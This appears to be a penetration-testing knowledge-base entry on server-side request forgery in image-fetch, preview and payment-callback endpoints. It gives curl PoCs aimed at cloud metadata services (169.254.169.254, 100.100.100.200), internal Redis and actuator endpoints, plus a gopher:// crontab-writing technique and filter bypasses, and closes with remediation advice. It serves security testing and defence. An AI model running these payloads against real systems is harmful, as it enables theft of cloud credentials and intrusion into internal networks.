---
id: "ssrf-to-internal"
title: "SSRF (image fetching / callback validation / promotional-link checks) against internal networks and cloud metadata"
kind: "implementation"
cve: null
related-cves: null
cve-note: "None (implementation flaw)"
severity: "high"
cvss: 8.2
severity-basis: "cvss"
severity-note: null
product: "Custom backends (image fetching, URL previews, payment-callback validation)"
versions: "Any"
ports: "80, 443"
keywords: "ssrf, internal network, metadata, 169.254.169.254, redis, gopher"
entry: "url=http://169.254.169.254/latest/meta-data/"
verified: false
verified-on: null
verification-evidence: null
source-url: null
vendor-advisory: null
cwe: null
patch-date: null
sources: "Compiled from public sources (implementation flaws; no CVE)"
kev: null
kev-date: null
kev-source: null
epss: null
epss-percentile: null
epss-date: null
epss-source: null
enrichment-updated: null
---

## Fingerprinting

```
/api/upload/fetch?url=       /api/common/preview?url=
/api/pay/check?notifyUrl=    /api/agent/link/check?url=
Support-system "send image link", promotion "external image URL"
```

## Prerequisites

- An account (most image-fetching endpoints require only login); an authorized environment.

## PoC

```bash
# 1) First probe outbound connections (DNSLog)
curl -s 'https://target/api/upload/fetch?url=http://xxxx.dnslog.cn/a'

# 2) Cloud metadata
curl -s 'https://target/api/upload/fetch?url=http://169.254.169.254/latest/meta-data/'
curl -s 'https://target/api/upload/fetch?url=http://100.100.100.200/latest/meta-data/'

# 3) Internal-network probing
curl -s 'https://target/api/upload/fetch?url=http://127.0.0.1:6379/'
curl -s 'https://target/api/upload/fetch?url=http://10.0.0.5:8080/actuator/env'
```

## Exploitation Steps

1. Determine whether the endpoint returns content/exposes only status/performs only DNS resolution (different exploitation depth for each).
2. Target cloud metadata: Alibaba Cloud `100.100.100.200` (may contain AK), AWS `169.254.169.254` (IMDSv1).
3. Internal lateral movement: Redis 6379 (construct `gopher://` requests to write crontab), internal admin panels (read configuration through `/actuator/env`).
4. Restriction bypasses: `http://127.0.0.1` → `http://[::1]`, `0.0.0.0`, `2130706433`, DNS rebinding.
5. Evidence: one returned-content sample (redacted) + timestamp; retain only DNS records for targets without outbound connectivity.

## Remediation and Mitigation

### Remediation and Mitigation (Hardening)

- URL allowlist (domain + port); block internal ranges and link-local addresses; validate resolved IPs rather than only strings.
- Disable redirect following; route outbound traffic through a common egress proxy; enable IMDSv2 for metadata services.

## References

- OWASP SSRF Prevention Cheat Sheet; cloud-provider metadata security guides.
